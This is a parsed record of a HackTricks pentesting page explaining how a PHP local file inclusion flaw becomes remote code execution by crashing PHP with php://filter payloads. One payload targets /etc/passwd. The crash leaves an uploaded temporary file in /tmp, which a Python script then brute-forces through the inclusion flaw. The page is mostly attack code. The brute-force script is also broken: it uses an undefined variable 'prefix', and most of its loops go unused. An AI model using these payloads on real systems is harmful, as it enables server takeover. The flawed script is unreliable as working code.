---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# LFI2RCE via Segmentation Fault

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-file-inclusion-lfi2rce-via-segmentation-fault` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [LFI2RCE via Segmentation Fault](../../topics/pentesting-web/lfi2rce-via-segmentation-fault.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-file-inclusion-lfi2rce-via-segmentation-fault |
| name | LFI2RCE via Segmentation Fault |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.md |

## Preserved Source Material

````yaml
_body: "# LFI2RCE via Segmentation Fault\n\n{{#include ../../banners/hacktricks-training.md}}\n\nAccording to the writeups\
  \ [https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/](https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/)\
  \ (second part) and [https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view](https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/rJlfZva0m?type=view),\
  \ the following payloads caused a segmentation fault in PHP:\n\n```php\n// PHP 7.0\ninclude(\"php://filter/string.strip_tags/resource=/etc/passwd\"\
  );\n\n// PHP 7.2\ninclude(\"php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA\"\
  );\n```\n\nYou should know that if you **send** a **POST** request **containing** a **file**, PHP will create a **temporary\
  \ file in `/tmp/php<something>`** with the contents of that file. This file will be **automatically deleted** once the request\
  \ was processed.\n\nIf you find a **LFI** and you manage to **trigger** a segmentation fault in PHP, the **temporary file\
  \ will never be deleted**. Therefore, you can **search** for it with the **LFI** vulnerability until you find it and execute\
  \ arbitrary code.\n\nYou can use the docker image [https://hub.docker.com/r/easyengine/php7.0](https://hub.docker.com/r/easyengine/php7.0)\
  \ for testing.\n\n```python\n# upload file with segmentation fault\nimport requests\nurl = \"http://localhost:8008/index.php?i=php://filter/string.strip_tags/resource=/etc/passwd\"\
  \nfiles = {'file': open('la.php','rb')}\nresponse = requests.post(url, files=files)\n\n\n# Search for the file (improve\
  \ this with threads)\nimport requests\nimport string\nimport threading\n\ncharset = string.ascii_letters + string.digits\n\
  \nhost = \"127.0.0.1\"\nport = 80\nbase_url = \"http://%s:%d\" % (host, port)\n\n\ndef bruteforce(charset):\n    for i in\
  \ charset:\n        for j in charset:\n            for k in charset:\n                for l in charset:\n              \
  \      for m in charset:\n                        for n in charset:\n                            filename = prefix + i +\
  \ j + k\n                            url = \"%s/index.php?i=/tmp/php%s\" % (base_url, filename)\n                      \
  \      print url\n                            response = requests.get(url)\n                            if 'spyd3r' in response.content:\n\
  \                                print \"[+] Include success!\"\n                                return True\n\n\ndef main():\n\
  \    bruteforce(charset)\n\nif __name__ == \"__main__\":\n    main()\n```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.md
````
